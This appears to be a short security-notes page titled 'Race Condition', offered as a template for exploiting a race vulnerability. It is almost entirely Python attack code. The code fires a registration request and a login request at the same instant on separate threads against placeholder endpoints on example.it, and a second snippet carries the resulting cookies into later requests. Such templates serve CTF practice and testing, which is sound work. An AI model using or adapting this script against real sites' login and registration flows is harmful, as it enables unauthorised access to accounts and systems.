---
description: This is a base mockup to exploit a race vulnerability.
cover: >-
  https://images.unsplash.com/photo-1511497584788-876760111969?ixid=MnwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8&ixlib=rb-1.2.1&auto=format&fit=crop&w=3432&q=80
coverY: 0
---

# Race Condition

```python
import requests
import random
import string
from threading import Thread
from time import sleep

# function to create random strings
def random_string(n):
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(n))

# url definitions
reg_url = "http://example.it/register.php"
login_url = "http://example.it/login.php"
r = requests.Session()

# cration of random username and password
username = random_string(10)
password = random_string(10)
 
# function to create threads
def threaded_reg():
    page = r.post(reg_url, data={"username": f"{username}", "password": f"{password}"})
 
def threaded_log():
    page = r.post(login_url, data={"username": f"{username}", "password": f"{password}"})
    print(page.text)

thread_reg = Thread(target = threaded_reg)
thread_log = Thread(target = threaded_log)
thread_reg.start()
thread_log.start()
```

If you need to deal with cookies to access other pages, you can use the following snippet.

```python
page = r.post(login_url, data={"username": f"{username}", 
                "password": f"{password}", "log_user" : ""})
cookie = page.cookies
page = r.get(home_url, data={"Cookie" : f"{cookie}"})
```
